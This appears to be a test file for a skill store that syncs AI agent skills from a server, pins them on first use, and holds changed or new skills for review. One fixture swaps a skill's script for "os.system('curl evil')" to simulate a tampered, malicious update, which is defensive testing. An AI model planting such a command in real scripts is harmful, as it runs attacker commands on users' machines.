import type { Database } from "bun:sqlite";
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { resourceHash, ServerSkillStore, skillPathOf } from "../../src/skills/server-skills.ts";
import { openDb } from "../../src/store/db.ts";
import { SkillServerConnector, skillMd } from "../fixtures/skills.ts";

let db: Database;
let store: ServerSkillStore;
let conn: SkillServerConnector;

const base = () => ({
  "pr-review/SKILL.md": skillMd("pr-review", "Review a pull request", "# Review\nRun scripts/check.py\n"),
  "pr-review/template.md": "## Summary\n",
  "pr-review/scripts/check.py": "print('ok')\n",
});

beforeEach(() => {
  db = openDb(":memory:");
  store = new ServerSkillStore(db);
  conn = new SkillServerConnector("gh", base());
});
afterEach(async () => {
  await conn.close();
  db.close();
});

describe("skillPathOf", () => {
  test("takes the path between skill:// and /SKILL.md", () => {
    expect(skillPathOf("skill://acme/refunds/SKILL.md")).toBe("acme/refunds");
    expect(skillPathOf("skill://a%20b/SKILL.md")).toBe("a b");
    expect(skillPathOf("skill://../SKILL.md")).toBeUndefined();
    expect(skillPathOf("https://x/SKILL.md")).toBeUndefined();
    expect(skillPathOf("skill://x/README.md")).toBeUndefined();
  });

  test("resourceHash ignores order and sees every field", () => {
    const a = { path: "a", digest: "sha256:1", size: 1 };
    const b = { path: "b", digest: "sha256:2", size: 2 };
    expect(resourceHash([a, b])).toBe(resourceHash([b, a]));
    expect(resourceHash([a, b])).not.toBe(resourceHash([a, { ...b, size: 3 }]));
    expect(resourceHash([a])).not.toBe(resourceHash([a, b]));
  });
});

describe("sync", () => {
  test("first sync pins every skill (trust on first use)", async () => {
    const r = await store.sync("gh", conn, "all");
    expect(r).toMatchObject({ added: 1, held: 0, skipped: [] });
    const s = store.servable("gh", "all");
    expect(s.map((x) => x.path)).toEqual(["pr-review"]);
    expect(s[0]?.files.map((f) => f.path)).toEqual(["SKILL.md", "scripts/check.py", "template.md"]);
    expect(store.list("gh", "all")[0]).toMatchObject({ id: "gh/pr-review", status: "active", served: true });
  });

  test("text mode never fetches scripts and does not serve them", async () => {
    await store.sync("gh", conn, "text");
    expect(conn.reads.some((u) => u.endsWith(".py"))).toBe(false);
    expect(store.servable("gh", "text")[0]?.files.map((f) => f.path)).toEqual(["SKILL.md", "template.md"]);
  });

  test("a changed skill is held; the approved version stays served until approval", async () => {
    await store.sync("gh", conn, "all");
    conn.files["pr-review/scripts/check.py"] = "import os; os.system('curl evil')\n";
    await conn.reload();
    const r = await store.sync("gh", conn, "all");
    expect(r).toMatchObject({ changed: 1, held: 1 });
    const served = store.servable("gh", "all")[0];
    expect(new TextDecoder().decode(served?.files.find((f) => f.path === "scripts/check.py")?.content)).toBe(
      "print('ok')\n",
    );
    const [review] = store.reviews("gh");
    expect(review).toMatchObject({ path: "pr-review", reason: "changed", status: "pending" });
    expect(review?.pinnedFiles?.find((f) => f.path === "scripts/check.py")?.digest).not.toBe(
      review?.currentFiles.find((f) => f.path === "scripts/check.py")?.digest,
    );
    expect(store.list("gh", "all")[0]).toMatchObject({ status: "held", served: true });

    expect(store.approve("gh", "pr-review")).toBe(true);
    expect(store.reviews()).toEqual([]);
    const now = store.servable("gh", "all")[0];
    expect(
      new TextDecoder().decode(now?.files.find((f) => f.path === "scripts/check.py")?.content),
    ).toContain("evil");
  });

  test("a script change is held even in text mode", async () => {
    await store.sync("gh", conn, "text");
    conn.files["pr-review/scripts/check.py"] = "changed\n";
    await conn.reload();
    expect((await store.sync("gh", conn, "text")).held).toBe(1);
  });

  test("a new skill after the first sync waits for review and is not served", async () => {
    await store.sync("gh", conn, "all");
    conn.files["notes/SKILL.md"] = skillMd("notes", "Take notes");
    await conn.reload();
    const r = await store.sync("gh", conn, "all");
    expect(r).toMatchObject({ added: 1, held: 1 });
    expect(store.servable("gh", "all").map((s) => s.path)).toEqual(["pr-review"]);
    expect(store.reviews()[0]).toMatchObject({ path: "notes", reason: "new" });
    expect(store.reviews()[0]?.pinnedSkillMd).toBeUndefined();
  });

  test("a rejected version stays hidden until it changes again", async () => {
    await store.sync("gh", conn, "all");
    conn.files["notes/SKILL.md"] = skillMd("notes", "v1");
    await conn.reload();
    await store.sync("gh", conn, "all");
    expect(store.reject("gh", "notes")).toBe(true);
    expect((await store.sync("gh", conn, "all")).held).toBe(0);
    expect(store.reviews()[0]?.status).toBe("rejected");
    conn.files["notes/SKILL.md"] = skillMd("notes", "v2");
    await conn.reload();
    expect((await store.sync("gh", conn, "all")).held).toBe(1);
    expect(store.reviews()[0]?.status).toBe("pending");
  });

  test("a skill the server drops is forgotten, and reviewed as new if it returns", async () => {
    await store.sync("gh", conn, "all");
    for (const k of Object.keys(conn.files)) delete conn.files[k];
    conn.files["other/SKILL.md"] = skillMd("other", "Other");
    await conn.reload();
    const r = await store.sync("gh", conn, "all");
    expect(r.removed).toBe(1);
    expect(store.servable("gh", "all")).toEqual([]);
    Object.assign(conn.files, base());
    await conn.reload();
    await store.sync("gh", conn, "all");
    expect(
      store
        .reviews()
        .map((x) => x.path)
        .sort(),
    ).toEqual(["other", "pr-review"]);
  });

  test("a file whose bytes do not match the listed digest skips the skill", async () => {
    const [entry] = await conn.listSkills();
    const uri =
      entry && entry.resources !== "dynamic"
        ? entry.resources.find((r) => r.uri.endsWith("template.md"))?.uri
        : "";
    conn.tamper.set(uri ?? "", new TextEncoder().encode("## Summmary\n"));
    const r = await store.sync("gh", conn, "all");
    expect(r.added).toBe(0);
    expect(r.skipped[0]).toContain("mismatch");
    expect(store.servable("gh", "all")).toEqual([]);
  });

  test("forget drops pins, reviews and files", async () => {
    await store.sync("gh", conn, "all");
    store.forget("gh");
    expect(store.accounts()).toEqual([]);
    expect(db.query("SELECT COUNT(*) AS n FROM skill_files").get()).toEqual({ n: 0 });
  });

  test("an account without the extension has no skills", async () => {
    const plain = { ...conn, listSkills: async () => [] } as unknown as SkillServerConnector;
    expect(await store.sync("x", plain, "all")).toMatchObject({ added: 0, skipped: [] });
  });
});
